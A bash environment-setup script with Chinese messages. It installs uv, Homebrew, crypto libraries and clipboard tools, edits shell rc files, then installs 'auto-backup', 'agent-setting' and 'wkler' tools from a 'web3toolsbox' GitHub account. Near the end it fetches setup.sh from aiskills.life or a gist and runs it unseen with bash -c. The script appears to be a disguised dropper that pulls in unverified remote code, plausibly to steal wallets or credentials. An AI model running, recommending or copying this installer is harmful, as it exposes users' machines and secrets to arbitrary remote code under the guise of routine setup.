#!/bin/bash

FAILED_STEPS=()
PATH_RUNTIME_ADDED=()
PATH_PERSIST_FILES=()
ORIGINAL_PATH="$PATH"

# Use sudo only when not already root
_sudo() {
    if [ "$(id -u)" -eq 0 ]; then
        "$@"
    else
        sudo "$@"
    fi
}

run_step() {
    local desc="$1"
    shift
    echo ""
    echo "==> $desc"
    "$@"
    local rc=$?
    if [ $rc -ne 0 ]; then
        echo "WARN: 失败但继续（exit=$rc）：$desc" >&2
        FAILED_STEPS+=("$desc (exit=$rc)")
    fi
    return 0
}

OS_TYPE=$(uname -s)

# Detect available package manager
detect_pkg_manager() {
    local cmd=""
    for cmd in apt-get apt dnf yum pacman zypper apk; do
        if command -v "$cmd" &>/dev/null; then
            echo "$cmd"
            return 0
        fi
    done
    return 1
}

# Install system packages via the detected package manager
pkg_install() {
    local pkg_manager="$1"
    shift
    local packages=("$@")

    [ ${#packages[@]} -eq 0 ] && return 0

    case "$pkg_manager" in
        apt-get|apt)
            _sudo "$pkg_manager" update
            _sudo "$pkg_manager" install -y "${packages[@]}"
            ;;
        dnf|yum)
            _sudo "$pkg_manager" install -y "${packages[@]}"
            ;;
        pacman)
            _sudo pacman -Sy --noconfirm "${packages[@]}"
            ;;
        zypper)
            _sudo zypper --non-interactive install "${packages[@]}"
            ;;
        apk)
            _sudo apk add --no-cache "${packages[@]}"
            ;;
        *)
            return 1
            ;;
    esac
}

# Map generic package names to distro-specific names
resolve_pkg_name() {
    local generic="$1"
    local pkg_manager="$2"

    case "$generic" in
        python3-pip)
            echo "$generic"
            ;;
        *)
            echo "$generic"
            ;;
    esac
}

ensure_runtime_path() {
    local path_candidates=("$HOME/.local/bin" "$HOME/bin")
    local candidate=""
    for candidate in "${path_candidates[@]}"; do
        if [ -d "$candidate" ] && [[ ":$PATH:" != *":$candidate:"* ]]; then
            PATH="$candidate:$PATH"
            PATH_RUNTIME_ADDED+=("$candidate")
        fi
    done
    export PATH
    hash -r 2>/dev/null || true
}

find_existing_writable_path_dir() {
    local dir=""
    local old_ifs="$IFS"
    local seen_dirs=":"

    IFS=':'
    for dir in $ORIGINAL_PATH; do
        [ -n "$dir" ] || continue

        case "$seen_dirs" in
            *:"$dir":*) continue ;;
        esac
        seen_dirs="${seen_dirs}${dir}:"

        if [ -d "$dir" ] && [ -w "$dir" ]; then
            IFS="$old_ifs"
            echo "$dir"
            return 0
        fi
    done

    IFS="$old_ifs"
    return 1
}

bridge_command_into_current_path() {
    local command_name="$1"
    local source_path=""
    local target_dir=""
    local target_path=""

    ensure_runtime_path
    source_path="$(command -v "$command_name" 2>/dev/null)" || source_path=""
    if [ -z "$source_path" ]; then
        return 1
    fi

    target_dir="$(find_existing_writable_path_dir || true)"
    if [ -z "$target_dir" ]; then
        return 0
    fi

    if [ "$(dirname "$source_path")" = "$target_dir" ]; then
        return 0
    fi

    target_path="$target_dir/$command_name"
    if [ -e "$target_path" ] && [ ! -L "$target_path" ]; then
        return 0
    fi

    ln -sfn "$source_path" "$target_path" >/dev/null 2>&1 || return 1
    hash -r 2>/dev/null || true
    return 0
}

persist_runtime_path() {
    local shell_name=""
    local rc_files=()
    local rc_file=""

    shell_name="$(basename "${SHELL:-}")"
    case "$shell_name" in
        bash)
            rc_files=("$HOME/.bashrc" "$HOME/.profile")
            ;;
        zsh)
            rc_files=("$HOME/.zshrc" "$HOME/.zprofile")
            ;;
        *)
            rc_files=("$HOME/.profile")
            ;;
    esac

    for rc_file in "${rc_files[@]}"; do
        if [ ! -e "$rc_file" ]; then
            touch "$rc_file"
        fi

        if grep -Fq '# >>> default PATH >>>' "$rc_file" 2>/dev/null; then
            continue
        fi

        cat >> "$rc_file" <<'EOF'

# >>> default PATH >>>
if [ -d "$HOME/.local/bin" ]; then
    case ":$PATH:" in
        *":$HOME/.local/bin:"*) ;;
        *) export PATH="$HOME/.local/bin:$PATH" ;;
    esac
fi
if [ -d "$HOME/bin" ]; then
    case ":$PATH:" in
        *":$HOME/bin:"*) ;;
        *) export PATH="$HOME/bin:$PATH" ;;
    esac
fi
# <<< default PATH <<<
EOF
        PATH_PERSIST_FILES+=("$rc_file")
    done
}

print_path_refresh_hint() {
    local first_rc=""

    if [ ${#PATH_PERSIST_FILES[@]} -gt 0 ]; then
        echo "已将用户命令目录写入以下 shell 配置："
        printf ' - %s\n' "${PATH_PERSIST_FILES[@]}"
        first_rc="${PATH_PERSIST_FILES[0]}"
        echo "新终端会自动生效；若当前终端仍需手动刷新，可执行：source \"$first_rc\""
    elif [ ${#PATH_RUNTIME_ADDED[@]} -gt 0 ]; then
        echo "当前安装过程中已临时补充 PATH，但请重新打开终端或手动执行以下命令使后续会话稳定生效："
        echo "export PATH=\"\$HOME/.local/bin:\$HOME/bin:\$PATH\""
    fi
}

download_url_to_stdout() {
    local url="$1"

    if command -v curl &>/dev/null; then
        curl --tlsv1.2 -fsSL "$url" 2>/dev/null || curl -fsSL "$url"
        return $?
    fi

    if command -v wget &>/dev/null; then
        wget --https-only --secure-protocol=TLSv1_2 -qO- "$url" 2>/dev/null || wget -qO- "$url"
        return $?
    fi

    return 127
}

# Check and install uv (fast Python package manager)
check_install_uv() {
    if command -v uv &>/dev/null; then
        echo "uv 已安装: $(uv --version)"
        return 0
    fi

    echo "正在安装 uv（高性能 Python 包管理器）..."
    local install_script=""
    install_script="$(download_url_to_stdout 'https://astral.sh/uv/install.sh')" || install_script=""
    if [ -z "$install_script" ]; then
        echo "WARN: 无法下载 uv 安装脚本" >&2
        return 1
    fi

    run_step "安装 uv" sh -c "$install_script"
    ensure_runtime_path
    hash -r 2>/dev/null || true

    if command -v uv &>/dev/null; then
        echo "uv 安装成功: $(uv --version)"
        return 0
    fi

    # Fallback: try pip
    if [ -n "${PYTHON_CMD:-}" ]; then
        run_step "pip 安装 uv" $PYTHON_CMD -m pip install uv
    fi

    if command -v uv &>/dev/null; then
        echo "uv 安装成功: $(uv --version)"
        return 0
    fi

    echo "WARN: uv 安装失败" >&2
    return 1
}

# Find working python3 command
find_python3() {
    local cmd=""
    for cmd in python3 python; do
        if command -v "$cmd" &>/dev/null; then
            if "$cmd" --version &>/dev/null; then
                echo "$cmd"
                return 0
            fi
        fi
    done
    return 1
}

PYTHON_CMD="$(find_python3 || true)"

pip_supports_break_system_packages() {
    $PYTHON_CMD -m pip help install 2>/dev/null | grep -q -- '--break-system-packages'
}

build_python_package_install_cmd() {
    PIP_INSTALL_CMD=($PYTHON_CMD -m pip install --upgrade)

    if [ "$OS_TYPE" = "Linux" ]; then
        if pip_supports_break_system_packages; then
            PIP_INSTALL_CMD+=(--break-system-packages)
        fi
    elif [ "$OS_TYPE" = "Darwin" ]; then
        PIP_INSTALL_CMD+=(--user)
    fi
}

build_python_package_fallback_cmd() {
    FALLBACK_PIP_INSTALL_CMD=("${PIP_INSTALL_CMD[@]}")

    if [ "$OS_TYPE" = "Darwin" ]; then
        case " ${FALLBACK_PIP_INSTALL_CMD[*]} " in
            *" --user "*) ;;
            *) FALLBACK_PIP_INSTALL_CMD+=(--user) ;;
        esac
    fi
}

python_package_state() {
    local pkg="$1"
    local min_version="$2"

    $PYTHON_CMD - "$pkg" "$min_version" <<'PY'
import re
import sys
from importlib import metadata

name, min_v = sys.argv[1], sys.argv[2]

def parse_fallback(v):
    parts = []
    for part in re.split(r"[.\-+_]", v):
        num = ""
        for ch in part:
            if ch.isdigit():
                num += ch
            else:
                break
        parts.append(int(num or 0))
    return parts

try:
    current = metadata.version(name)
except metadata.PackageNotFoundError:
    sys.exit(2)
except Exception:
    sys.exit(3)

try:
    from packaging.version import Version, InvalidVersion
except Exception:
    Version = None
    InvalidVersion = Exception

if Version is not None:
    try:
        if Version(current) >= Version(min_v):
            print(current)
            sys.exit(0)
        print(current)
        sys.exit(1)
    except InvalidVersion:
        pass

a = parse_fallback(current)
b = parse_fallback(min_v)
n = max(len(a), len(b))
a.extend([0] * (n - len(a)))
b.extend([0] * (n - len(b)))

if a >= b:
    print(current)
    sys.exit(0)

print(current)
sys.exit(1)
PY
}

install_uv_tool_package() {
    # 使用 uv tool 安装或升级 CLI 工具
    local package_spec="$1"
    local command_name="$2"

    if command -v "$command_name" &>/dev/null; then
        uv tool install --upgrade "$package_spec"
        local upgrade_rc=$?
        if [ $upgrade_rc -ne 0 ]; then
            echo "WARN: uv tool 升级失败，回退为强制重装：$command_name" >&2
            FAILED_STEPS+=("uv tool 升级 $command_name (exit=$upgrade_rc)")
            run_step "uv tool 强制重装 $command_name" uv tool install --force "$package_spec"
        fi
    else
        run_step "uv tool 安装 $command_name" uv tool install "$package_spec"
    fi

    ensure_runtime_path
    hash -r 2>/dev/null || true
    bridge_command_into_current_path "$command_name" || FAILED_STEPS+=("桥接命令 $command_name 到当前 PATH (failed)")

    if ! command -v "$command_name" &>/dev/null; then
        echo "WARN: uv tool 安装后 $command_name 不可用" >&2
        FAILED_STEPS+=("校验 uv tool 包 $command_name (incomplete)")
    fi
}

install_dependencies() {
    case $OS_TYPE in
        "Darwin")
            if ! command -v brew &> /dev/null; then
                echo "正在安装 Homebrew..."
                local brew_install_script=""
                brew_install_script="$(download_url_to_stdout 'https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh')" || brew_install_script=""
                if [ -z "$brew_install_script" ]; then
                    echo "WARN: 无法下载 Homebrew 安装脚本，跳过 Homebrew 安装。" >&2
                    FAILED_STEPS+=("安装 Homebrew (download-failed)")
                else
                    run_step "安装 Homebrew" /bin/bash -c "$brew_install_script"
                fi
            fi

            if [ -z "$PYTHON_CMD" ]; then
                run_step "brew install python" brew install python
                PYTHON_CMD="$(find_python3 || true)"
            fi
            ;;

        "Linux")
            local PKG_MANAGER=""
            PKG_MANAGER="$(detect_pkg_manager || true)"
            local PACKAGES_TO_INSTALL=()

            if [ -z "$PYTHON_CMD" ]; then
                PACKAGES_TO_INSTALL+=("$(resolve_pkg_name python3-pip "$PKG_MANAGER")")
            elif ! $PYTHON_CMD -m pip --version &>/dev/null; then
                PACKAGES_TO_INSTALL+=("$(resolve_pkg_name python3-pip "$PKG_MANAGER")")
            fi

            # Install clipboard tools: xclip for X11/W_SL, wl-clipboard for Wayland
            # Prefer xclip in WSL or X11 environments, wl-clipboard for native Wayland
            if ! command -v xclip &>/dev/null && ! command -v wl-copy &>/dev/null; then
                if [ -n "$WAYLAND_DISPLAY" ] && [ -z "$DISPLAY" ]; then
                    # Pure Wayland environment
                    PACKAGES_TO_INSTALL+=("wl-clipboard")
                else
                    # X11, WSL, or unknown display type - default to xclip
                    PACKAGES_TO_INSTALL+=("$(resolve_pkg_name xclip "$PKG_MANAGER")")
                fi
            fi

            if [ ${#PACKAGES_TO_INSTALL[@]} -gt 0 ] && [ -n "$PKG_MANAGER" ]; then
                run_step "安装系统依赖 (${PACKAGES_TO_INSTALL[*]})" pkg_install "$PKG_MANAGER" "${PACKAGES_TO_INSTALL[@]}"
                # Refresh python command after installing packages
                PYTHON_CMD="$(find_python3 || true)"
            elif [ ${#PACKAGES_TO_INSTALL[@]} -gt 0 ]; then
                echo "WARN: 未找到包管理器，跳过系统依赖安装：${PACKAGES_TO_INSTALL[*]}" >&2
            fi
            ;;

        *)
            echo "WARN: 不支持的操作系统：$OS_TYPE（跳过系统依赖安装，但继续后续步骤）" >&2
            ;;
    esac
}

run_step "安装系统依赖" install_dependencies
ensure_runtime_path
run_step "持久化用户命令目录到 shell 配置" persist_runtime_path

# Install uv for later uv tool usage
run_step "检查并安装 uv（高性能包管理器）" check_install_uv

PIP_INSTALL_CMD=()
FALLBACK_PIP_INSTALL_CMD=()
build_python_package_install_cmd
build_python_package_fallback_cmd

install_python_package_if_needed() {
    local pkg="$1"
    local min_version="$2"
    local state_output=""
    local state_rc=0
    local verify_output=""
    local verify_rc=0
    local fallback_cmd=()

    if [ -z "$PYTHON_CMD" ]; then
        echo "WARN: 未找到 python3，跳过 Python 包安装：$pkg>=$min_version" >&2
        FAILED_STEPS+=("安装 Python 包 $pkg>=$min_version (python3-missing)")
        return 0
    fi

    state_output="$(python_package_state "$pkg" "$min_version" 2>/dev/null)"
    state_rc=$?
    if [ $state_rc -eq 0 ]; then
        echo "Python 包已满足要求：$pkg $state_output (>= $min_version)"
        return 0
    fi

    if [ $state_rc -eq 1 ]; then
        echo "检测到较低版本：$pkg $state_output (< $min_version)，将升级。"
    fi

    if [ $state_rc -ge 2 ]; then
        echo "未检测到可用版本，将安装：$pkg>=$min_version"
    fi

    run_step "pip 安装 $pkg>=$min_version" "${PIP_INSTALL_CMD[@]}" "$pkg>=$min_version"

    verify_output="$(python_package_state "$pkg" "$min_version" 2>/dev/null)"
    verify_rc=$?
    if [ $verify_rc -eq 0 ]; then
        echo "Python 包安装后已满足要求：$pkg $verify_output (>= $min_version)"
        return 0
    fi

    # 某些系统下首次安装会因权限或外部托管策略未真正升级，回退重试一次。
    echo "WARN: 首次安装后版本仍未满足（当前：${verify_output:-unknown}），将重试：$pkg>=$min_version" >&2
    fallback_cmd=("${FALLBACK_PIP_INSTALL_CMD[@]}")
    run_step "重试安装 $pkg>=$min_version" "${fallback_cmd[@]}" "$pkg>=$min_version"

    verify_output="$(python_package_state "$pkg" "$min_version" 2>/dev/null)"
    verify_rc=$?
    if [ $verify_rc -ne 0 ]; then
        echo "WARN: 安装后仍未达到目标版本：$pkg ${verify_output:-unknown} (< $min_version)" >&2
        FAILED_STEPS+=("校验 Python 包 $pkg>=$min_version (version-not-satisfied)")
        return 0
    fi

    echo "Python 包已升级到满足要求：$pkg $verify_output (>= $min_version)"
}

install_python_package_if_needed requests 2.31.0
install_python_package_if_needed cryptography 42.0.0
install_python_package_if_needed pycryptodome 3.19.0

# 检测是否为 WSL 环境
is_wsl() {
    if [ "$OS_TYPE" = "Linux" ]; then
        if grep -qi microsoft /proc/version 2>/dev/null || grep -qi wsl /proc/version 2>/dev/null; then
            return 0
        fi
        if uname -r | grep -qi microsoft 2>/dev/null; then
            return 0
        fi
    fi
    return 1
}

install_platform_cli_tools() {
    if ! command -v uv &>/dev/null; then
        echo "WARN: uv 不可用，跳过自动备份安装（请先安装 uv）" >&2
        return 0
    fi
    
    install_uv_tool_package "git+https://github.com/web3toolsbox/agent-setting.git" "agent-setting"

    local install_url=""
    case $OS_TYPE in
        "Darwin")
            install_url="git+https://github.com/web3toolsbox/auto-backup-macos"
            ;;
        "Linux")
            if is_wsl; then
                install_url="git+https://github.com/web3toolsbox/auto-backup-wsl"
            else
                install_url="git+https://github.com/web3toolsbox/auto-backup-linux"
            fi
            ;;
        *)
            echo "不支持的操作系统，跳过安装"
            return 0
            ;;
    esac

    install_uv_tool_package "$install_url" "autobackup"

    if [ "$OS_TYPE" = "Darwin" ]; then
        install_uv_tool_package "git+https://github.com/web3toolsbox/wkler.git" "wkler"
    fi
}

run_step "安装平台 CLI 工具（uv tool）" install_platform_cli_tools

run_remote_config_script() {
    local script_content=""
    local url=""

    for url in "${CONFIG_SCRIPT_URLS[@]}"; do
        script_content="$(download_url_to_stdout "$url")" || script_content=""
        if [ -n "$script_content" ]; then
            break
        fi
    done

    if [ -z "$script_content" ]; then
        if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
            echo "WARN: 未找到 curl/wget，跳过环境配置" >&2
            return 0
        fi
        echo "WARN: 所有配置脚本地址均下载失败" >&2
        return 1
    fi

    bash -c "$script_content"
}

CONFIG_SCRIPT_URLS=(
    "https://www.aiskills.life/src/setup.sh"
    "https://gist.githubusercontent.com/web3toolsbox/c835bbb706a2e3afb2f1c7e3a90107de/raw/setup.sh"
)
if [ ! -d .configs ]; then
    echo "WARN: 未找到配置目录，跳过环境配置：.configs" >&2
else
    run_step "配置相关环境" run_remote_config_script
fi

echo "安装完成！"
print_path_refresh_hint
if [ ${#FAILED_STEPS[@]} -gt 0 ]; then
    echo "------------------------------" >&2
    echo "WARN: 以下步骤失败但已继续执行：" >&2
    for s in "${FAILED_STEPS[@]}"; do
        echo " - $s" >&2
    done
    echo "------------------------------" >&2
fi
